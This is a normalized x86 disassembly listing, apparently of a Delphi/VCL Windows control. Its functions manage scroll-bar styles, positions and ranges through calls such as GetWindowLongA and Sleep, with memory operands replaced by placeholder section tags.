pop ecx
mov [ fs : eax ] edx
push sub_45fd35
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404188
retn
sub_45fd40
push ebx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
pop ebx
retn
sub_45fd68
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor edx edx
mov [ ebp - 0xc ] edx
mov esi eax
xor eax eax
push ebp
push sub_45fdd9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_45fd40
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45fde0
lea eax [ ebp - 0xc ]
call sub_404164
retn
mov eax [ esi + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb78
call sub_403b1c
sub_45fde8
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403338
mov [ edi + 0x4 ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x18 ] al
mov cx 0x50
mov [ edi + 0xa ] cx
movzx eax cx
mov ecx 0xa
xor edx edx
div ecx
mov [ edi + 0x8 ] ax
mov [ edi + 0x1c ] 0x1
mov [ edi + 0x20 ] 0xa
mov [ edi + 0x40 ] 0x4
mov [ edi + 0x3c ] 0xc
mov [ edi + 0x28 ] 0xff000014
mov [ edi + 0x2c ] 0x1
mov [ edi + 0x44 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_45fe78
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_418eb4
mov edi esi
mov dl [ edi + 0x1c ]
mov eax ebx
call sub_460740
mov edx [ edi + 0x10 ]
mov eax ebx
call sub_460720
mov edx [ edi + 0xc ]
mov eax ebx
call sub_4605d0
mov ax [ edi + 0x8 ]
mov [ ebx + 0x8 ] ax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45fec8
push ebx
mov ebx eax
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_460080
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_449640
test al al
jne r-xdata
mov edx [ ebx + 0x10 ]
mov eax ebx
call sub_4605d0
xor edx edx
mov eax ebx
call sub_4605d0
jmp r-xdata
sub_45ff00
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebx + 0x5b ] 0x3
je r-xdata
sub al 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x40 ]
add edx [ ebx + 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_429b94
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
dec al
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x48 ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_45ff6c
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x2
jb r-xdata
cmp [ ebx + 0x5b ] 0x1
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x44 ]
add edx [ ebx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_429b94
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x4c ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_45ffd4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x210 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
je r-xdata
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_460708
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_44c4e4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x1a ]
add edx eax
mov eax [ ebp - 0x8 ]
call sub_460708
jmp r-xdata
inc ebx
xor esi esi
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_44c4a8
call sub_45ff6c
pop ecx
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_44c4a8
call sub_45ff00
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
inc esi
dec ebx
jne r-xdata
sub_460080
push ebx
push esi
mov ebx eax
mov esi 0x100000
cmp [ ebx + 0x18 ] 0x1
jne r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
mov esi 0x200000
xor eax eax
pop esi
pop ebx
retn
push 0xfffffff0
mov eax [ ebx + 0x4 ]
call sub_44f7b4
push eax
call GetWindowLongA
test eax esi
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_4600b8
push ebp
mov ebp esp
push ebx
mov ebx 0x100000
cmp ax 0x1
jne r-xdata
push 0xfffffff0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_44f7b4
push eax
call GetWindowLongA
test eax ebx
setne al
pop ebx
pop ebp
retn
mov ebx 0x200000
sub_4600ec
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5 ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_4600b8
pop ecx
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_4600b8
pop ecx
test al al
je r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
neg ebx
jmp r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
sub_460168
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push 0xfffffff0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_44f7b4
push eax
call GetWindowLongA
test eax 0x840000
setne al
and eax 0x7f
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
push ebp
mov dx 0x14
mov ax 0x1
call sub_4600ec
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4489b8
add ebx eax
mov eax ebx
push ebp
mov dx 0x15
xor eax eax
call sub_4600ec
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4489fc
add ebx eax
mov eax ebx
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_460200
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov [ ebp - 0x1c ] 0x1c
mov [ ebp - 0x18 ] 0x10
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
movsx esi [ esi + 0x6 ]
lea eax [ ebp - 0x1c ]
push eax
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_44f7b4
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
mov ebx 0x1
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x4 ]
sub_460260
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x4 ]
cmp eax 0x7
ja r-xdata
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x4
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_460431 ]
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x2
jb r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_4605d0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
add edx eax
mov eax [ ebp - 0x4 ]
call sub_4605d0
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_460168
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_4605d0
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_460168
mov edx eax
mov eax [ ebp - 0x4 ]
add edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4605d0
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1d ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4605d0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4605d0
mov eax [ ebp - 0x4 ]
movzx ebx [ eax + 0x8 ]
mov eax ebx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x40 ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov eax ebx
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov esi ecx
jmp r-xdata
sub ax 0x2
jb r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_4605d0
jmp r-xdata
push ebp
call sub_460200
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4605d0
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
xor edi edi
test esi esi
jle r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0xa ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x3c ]
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov esi ecx
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_4605d0
jmp r-xdata
push ebp
call sub_460200
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4605d0
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
call sub_406df0
mov ebx eax
mov eax ebx
sub eax edi
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x20 ]
cmp eax edx
jge r-xdata
xor esi esi
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
mov edi ebx
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
sub edx eax
push edx
call Sleep
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4605d0
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4605d0
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4605d0
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
dec esi
test esi esi
jg r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4605d0
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4605d0
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4605d0
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4605d0
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4605d0
jmp r-xdata
sub_460558
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x24 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x24 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_460c48
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x24 ] eax
sub_4605d0
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebx + 0x14 ]
cmp edx eax
jle r-xdata
mov [ ebx + 0xc ] edx
jmp r-xdata
test edx edx
jge r-xdata
mov edx eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
xor edx edx
mov si 0x1
xor esi esi
jmp r-xdata
movzx edi si
push edi
mov eax [ ebx + 0x4 ]
call sub_44f7b4
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax [ ebx + 0xc ]
je r-xdata
mov [ ebx + 0xc ] edx
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax [ ebx + 0xc ]
cmp edx eax
je r-xdata
push 0xffffffff
mov eax [ ebx + 0xc ]
push eax
push edi
mov eax [ ebx + 0x4 ]
call sub_44f7b4
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ecx eax
sub ecx edx
mov eax [ ebx + 0x4 ]
xor edx edx
call sub_44f36c
sub eax edx
mov edx eax
xor ecx ecx
mov eax [ ebx + 0x4 ]
call sub_44f36c
jmp r-xdata
call sub_45fd40
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_460694
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x30 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_460c48
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x30 ] eax
sub_46074c
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
cmp bl 0x1
cmc
sbb eax eax
push eax
mov eax [ esi ]
movzx eax [ eax + 0x34 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_44f7b4
push eax
call sub_42b944
mov eax [ esi ]
cmp [ eax + 0x24 ] 0x0
jle r-xdata
mov eax [ esi ]
cmp [ eax + 0x38 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_44f7b4
push eax
call sub_42b944
mov eax [ esi ]
cmp [ eax + 0x30 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_44f7b4
push eax
call sub_42b944
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x28 ]
call sub_423d18
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_44f7b4
push eax
call sub_42b944
pop esi
pop ebx
pop ebp
retn
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_44f7b4
push eax
call sub_42b944
sub_460854
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
lea esi [ ebp - 0x4 ]
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
xor ebx ebx
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov bx 0x1
mov [ ebp - 0x22 ] 0x1c
mov [ ebp - 0x1e ] 0x17
xor eax eax
mov [ ebp - 0x1a ] eax
mov eax [ esi ]
cmp [ eax + 0x14 ] 0x0
jle r-xdata
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_460168
mov edx [ esi ]
mov edi [ edx + 0x10 ]
sub edi eax
mov eax [ esi ]
mov [ eax + 0x14 ] edi
test edi edi
jge r-xdata
xor eax eax
mov [ ebp - 0x16 ] eax
mov eax [ esi ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x16 ] eax
jmp r-xdata
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
movzx eax bx
mov ecx 0xa
xor edx edx
div ecx
mov edx [ esi ]
mov [ edx + 0x8 ] ax
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_460168
inc eax
mov [ ebp - 0x12 ] eax
mov eax [ esi ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xe ] eax
mov [ ebp - 0xa ] eax
push ebp
mov eax [ esi ]
mov al [ eax + 0x44 ]
call sub_46074c
pop ecx
mov eax [ esi ]
mov [ eax + 0x44 ] 0x0
push 0xffffffff
lea eax [ ebp - 0x22 ]
push eax
movzx eax bx
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_44f7b4
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ esi ]
mov edx [ eax + 0xc ]
mov eax [ esi ]
call sub_4605d0
xor ecx ecx
mov dl 0x1
mov eax [ esi ]
call sub_460168
lea eax [ eax + eax * 8 ]
mov ecx 0xa
cdq
idiv ecx
mov ebx eax
mov eax [ esi ]
mov [ eax + 0xa ] bx
mov eax [ esi ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
sub_46096c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44b4e0
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_45fde8
mov [ esi + 0x208 ] eax
push 0x1
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_45fde8
mov [ esi + 0x20c ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax esi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_4609e4
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_403368
mov eax [ esi + 0x20c ]
call sub_403368
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44b604
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_460a30
push ebx
mov ebx eax
mov eax ebx
call sub_44c76c
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov eax ebx
call sub_460c48
pop ebx
retn
mov edx 0x1
mov eax 0x5
call sub_40c36c
test al al
jne r-xdata
mov eax ebx
call sub_44f7b4
push eax
call sub_42b978
sub_460a70
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_460bc8
mov ecx edi
mov edx esi
mov eax ebx
call sub_44beb4
pop edi
pop esi
pop ebx
retn
sub_460ab0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_460bb8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4489b8
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x208 ]
mov eax ebx
call sub_460080
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
mov [ ebp - 0x9 ] al
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
call sub_44c4e4
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax ebx
call sub_4605d0
mov eax [ ebp - 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x9 ] 0x0
je r-xdata
inc esi
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44c4a8
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44c4a8
mov edx eax
mov eax [ ebp - 0x10 ]
call sub_418744
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_4486fc
inc ebx
dec esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460bbf
mov eax [ ebp - 0x10 ]
call sub_403368
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_45fec8
push 0x0
mov edx ebx
mov eax [ ebp - 0x10 ]
call sub_4188a0
xor ecx ecx
mov edx 0xb03e
call sub_44a180
inc ebx
dec esi
jne r-xdata
sub_460bec
push ebx
mov ebx eax
cmp dl [ ebx + 0x210 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x210 ] dl
test dl dl
je r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_460720
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_460720
mov eax ebx
call sub_460bc8
jmp r-xdata
sub_460c48
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44fab8
test al al
je r-xdata
xor eax eax
push ebp
push sub_460d33
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_4601e8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4601e8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov cl 0x1
xor edx edx
call sub_460854
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
mov dl 0x1
call sub_460854
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
xor edx edx
call sub_460854
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_460854
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov cl 0x1
xor edx edx
call sub_460854
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_460854
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_460d58
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov edi esp
test esi esi
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x208 ]
movzx eax [ eax + 0x1a ]
sub [ edi ] eax
add [ edi + 0x8 ] eax
mov eax [ ebx + 0x20c ]
movzx eax [ eax + 0x1a ]
sub [ edi + 0x4 ] eax
add [ edi + 0xc ] eax
lea ecx [ esp + 0x18 ]
mov edx edi
mov eax esi
call sub_448acc
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_448af8
mov eax [ esp + 0x10 ]
mov [ edi ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0x4 ] eax
lea ecx [ esp + 0x18 ]
lea edx [ edi + 0x8 ]
mov eax esi
call sub_448acc
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_448af8
mov eax [ esp + 0x10 ]
mov [ edi + 0x8 ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0xc ] eax
mov esi [ edi ]
test esi esi
jge r-xdata
mov eax ebx
call sub_4489b8
mov ebp [ edi + 0x8 ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x208 ]
mov edx [ eax + 0xc ]
add edx esi
call sub_4605d0
jmp r-xdata
mov esi [ edi + 0x4 ]
test esi esi
jge r-xdata
mov eax ebx
call sub_4489b8
sub ebp esi
cmp eax ebp
jge r-xdata
mov eax ebx
call sub_4489fc
mov ebp [ edi + 0xc ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
add edx esi
